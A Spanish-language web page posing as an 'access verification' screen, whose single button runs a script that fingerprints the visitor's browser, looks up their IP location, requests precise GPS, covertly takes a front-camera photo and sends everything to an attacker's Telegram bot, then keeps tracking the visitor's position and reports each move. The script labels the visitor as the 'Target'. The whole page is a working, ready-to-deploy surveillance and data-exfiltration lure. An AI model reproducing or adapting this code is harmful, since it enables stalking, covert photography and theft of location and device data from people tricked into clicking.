<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación de Acceso</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: black; color: white; }
        button { background: blue; padding: 15px 30px; border: none; border-radius: 10px; color: white; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Verificación de Acceso</h1>
    <button id="btn">Verificar ahora</button>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        // 🔐 CAMBIA ESTO POR TU NUEVO TOKEN (revoca el viejo con @BotFather)
        const BOT_TOKEN = 'TU_NUEVO_TOKEN_AQUI';
        const CHAT_ID = '7555997298';

        // -------------------- FINGERPRINT --------------------
        async function getFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200; canvas.height = 50;
            ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("Fingerprint", 10, 30);
            const canvasHash = canvas.toDataURL().slice(0, 100);
            let gpu = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
            } catch(e) {}
            const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
            const availableFonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
            return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
        }

        // -------------------- IP INFO (FALLBACK) --------------------
        async function getIPinfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    region: data.region,
                    city: data.city,
                    postal: data.postal,
                    timezone: data.timezone
                };
            } catch(e) { return null; }
        }

        // -------------------- DEVICE INFO --------------------
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let model = "Desconocido";
            if (ua.includes('iPhone')) model = 'iPhone';
            else if (ua.includes('iPad')) model = 'iPad';
            else if (ua.includes('Android')) model = 'Android';
            else if (ua.includes('Mac')) model = 'Mac';
            else if (ua.includes('Windows')) model = 'Windows PC';
            const language = navigator.language || navigator.userLanguage;
            const resolution = `${window.screen.width}x${window.screen.height}`;
            const cpuCores = navigator.hardwareConcurrency || 'N/A';
            return { model, ua, language, resolution, cpuCores };
        }

        // -------------------- STORAGE --------------------
        async function getStorageInfo() {
            try {
                const est = await navigator.storage.estimate();
                const totalGB = (est.quota / (1024**3)).toFixed(2);
                const usedGB = (est.usage / (1024**3)).toFixed(2);
                return { total: totalGB, used: usedGB };
            } catch(e) { return { total: 'N/A', used: 'N/A' }; }
        }

        // -------------------- GPS (EXACTO) --------------------
        function getCurrentPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) reject(new Error('No soportado'));
                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
            });
        }

        // -------------------- CÁMARA FRONTAL (con fallback) --------------------
        async function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            } catch(e) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                } catch(err) { return null; }
            }
            video.srcObject = stream;
            await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
            stream.getTracks().forEach(t => t.stop());
            return blob;
        }

        // -------------------- ENVÍOS A TELEGRAM --------------------
        async function sendMessage(text) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }
        async function sendPhoto(blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'photo.jpg');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        // -------------------- GEOLOCALIZACIÓN CONTINUA (OPCIONAL) --------------------
        let watchId = null;
        let lastLat = null, lastLng = null;
        function startContinuousTracking() {
            if (!navigator.geolocation) return;
            watchId = navigator.geolocation.watchPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    if (lastLat !== null) {
                        const R = 6371000;
                        const dLat = (lat - lastLat) * Math.PI / 180;
                        const dLon = (lng - lastLng) * Math.PI / 180;
                        const a = Math.sin(dLat/2)**2 + Math.cos(lastLat * Math.PI/180) * Math.cos(lat * Math.PI/180) * Math.sin(dLon/2)**2;
                        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
                        const distance = R * c;
                        if (distance < 50) return;
                    }
                    lastLat = lat;
                    lastLng = lng;
                    await sendMessage(`🔄 *Posición actualizada*\n📍 https://www.google.com/maps?q=${lat},${lng}\n*Precisión:* ±${position.coords.accuracy}m`);
                },
                () => {},
                { enableHighAccuracy: true, maximumAge: 10000, timeout: 30000 }
            );
        }

        // -------------------- ACCIÓN DEL BOTÓN --------------------
        document.getElementById('btn').onclick = async () => {
            const [fp, ipInfo, device, storage, position] = await Promise.all([
                getFingerprint(),
                getIPinfo(),
                getDeviceInfo(),
                getStorageInfo(),
                getCurrentPosition().catch(() => null)
            ]);

            let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
            message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
            message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
            message += `🌐 *Network*\n   • IP Address: ${ipInfo ? ipInfo.ip : 'N/A'}\n   • Language: ${device.language}\n\n`;
            message += `📍 *Location*\n`;
            if (position) {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                message += `   • GPS: ${lat}, ${lng}\n   • Accuracy: ±${position.coords.accuracy} meters\n`;
                message += `   • Google Maps: https://www.google.com/maps?q=${lat},${lng}\n`;
            } else if (ipInfo && ipInfo.city) {
                message += `   • IP approximate location:\n`;
                message += `   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n`;
                message += `   • Postal Code: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
                message += `   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
            } else {
                message += `   • No disponible\n`;
            }
            message += `\n🖼️ *Display*\n   • Resolution: ${device.resolution}\n`;
            message += `🔐 *Permissions*\n   • Camera: ${navigator.mediaDevices ? 'Requested' : 'Not supported'}\n   • Location: ${position ? 'Granted' : 'Denied'}\n`;
            message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A\n   • Storage Used: ${storage.used} GB / Total: ${storage.total} GB\n`;
            message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @TuApodo\n`;

            await sendMessage(message);
            const foto = await capturePhoto();
            if (foto) await sendPhoto(foto);
            startContinuousTracking(); // comenta esta línea si no quieres seguimiento
        };
    </script>
</body>
</html>
